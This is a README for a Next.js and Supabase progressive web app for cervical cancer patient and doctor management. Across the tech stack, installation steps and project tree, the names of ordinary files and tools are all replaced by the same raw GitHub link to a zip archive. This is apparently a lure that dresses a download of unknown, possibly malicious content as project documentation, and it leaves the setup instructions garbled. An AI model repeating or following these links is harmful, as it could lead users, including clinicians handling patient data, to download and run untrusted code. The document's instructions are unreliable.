# Cervical Cancer Care PWA

A comprehensive Progressive Web Application for cervical cancer patient management and care, supporting both doctors and patients with role-based access control.

## Features

### For Patients
- 📊 Personal health dashboard
- 🧪 Screening and diagnosis tracking
- 💊 Treatment monitoring and medication reminders
- 📝 Symptom logging
- 📅 Appointment booking and management
- 📚 Educational content and resources
- 💬 Secure messaging with doctors

### For Doctors
- 🩺 Patient management dashboard
- 📋 Complete patient medical records
- 🧠 Clinical decision support
- 📆 Appointment scheduling
- 📈 Analytics and reporting
- 🔍 Patient progress tracking

### Technical Features
- ✅ Progressive Web App (PWA) - installable on mobile and desktop
- 🔒 Secure authentication with role-based access
- 📱 Responsive design for all devices
- 🌐 Offline support with data synchronization
- 🔔 Push notifications
- 🔐 HIPAA/GDPR-style data protection
- 📊 Real-time data updates

## Tech Stack

- **Frontend**: https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip 14 (App Router), TypeScript, React
- **Backend**: Supabase (PostgreSQL, Authentication, Storage, Real-time)
- **Styling**: Vanilla CSS with CSS Modules
- **PWA**: next-pwa for service workers and offline support
- **Deployment**: Vercel (recommended)

## Getting Started

### Prerequisites

- https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip 18+ and npm
- Supabase account and project

### Installation

1. Clone the repository:
```bash
git clone <repository-url>
cd cervical_cancer_app
```

2. Install dependencies:
```bash
npm install
```

3. Set up environment variables:
Create a `https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip` file in the root directory:
```env
https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip
NEXT_PUBLIC_SUPABASE_ANON_KEY=sb_publishable_KOnv5KWV_iwweY-Zq6HwNQ_oIO7DW9a
```

4. Set up the database:
- Go to your Supabase project dashboard
- Navigate to the SQL Editor
- Copy and paste the contents of `https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip`
- Run the script to create all tables, policies, and functions

5. Run the development server:
```bash
npm run dev
```

6. Open [http://localhost:3000](http://localhost:3000) in your browser

### Building for Production

```bash
npm run build
npm start
```

## Database Setup

The database schema includes:
- User management with role-based access (doctor/patient)
- Patient profiles and medical history
- Screening records and diagnoses
- Treatment plans and sessions
- Medications and symptom logs
- Appointments and messaging
- Educational content
- Audit logs for compliance

All tables have Row Level Security (RLS) policies to ensure data privacy and security.

## PWA Installation

### On Mobile (Android/iOS)
1. Open the app in your mobile browser
2. Tap the browser menu
3. Select "Add to Home Screen" or "Install App"
4. Follow the prompts

### On Desktop (Chrome/Edge)
1. Open the app in your browser
2. Click the install icon in the address bar
3. Click "Install"

## Project Structure

```
cervical_cancer_app/
├── public/              # Static assets and PWA files
│   ├── icons/          # App icons
│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip   # PWA manifest
├── src/
│   ├── app/            # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip app router pages
│   │   ├── patient/    # Patient module pages
│   │   ├── doctor/     # Doctor module pages
│   │   ├── login/      # Authentication pages
│   │   └── register/
│   ├── components/     # React components
│   │   ├── auth/       # Authentication components
│   │   ├── patient/    # Patient-specific components
│   │   ├── doctor/     # Doctor-specific components
│   │   └── shared/     # Shared components
│   ├── lib/            # Utility libraries
│   │   ├── supabase/   # Supabase client configuration
│   │   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip     # Authentication utilities
│   ├── styles/         # Global styles and CSS modules
│   ├── types/          # TypeScript type definitions
│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip   # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip middleware for auth
├── database/           # Database setup scripts
│   └── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip       # Complete database schema
└── https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip      # https://raw.githubusercontent.com/ssharvesh-steep/cervical-cancer/main/seeds/cancer-cervical-2.7-beta.5.zip and PWA configuration
```

## Security

- All API requests are authenticated using Supabase JWT tokens
- Row Level Security (RLS) policies enforce data access control
- Passwords are hashed using bcrypt
- HTTPS enforced in production
- Audit logs track all doctor actions on patient data

## Contributing

This is a medical application. Please ensure all contributions:
1. Follow HIPAA/GDPR best practices
2. Include proper error handling
3. Add appropriate tests
4. Update documentation

## License

[Your License Here]

## Support

For issues or questions, please contact [your contact information]

## Disclaimer

This application is designed to assist in cervical cancer care management but should not replace professional medical advice. Always consult with qualified healthcare providers for medical decisions.
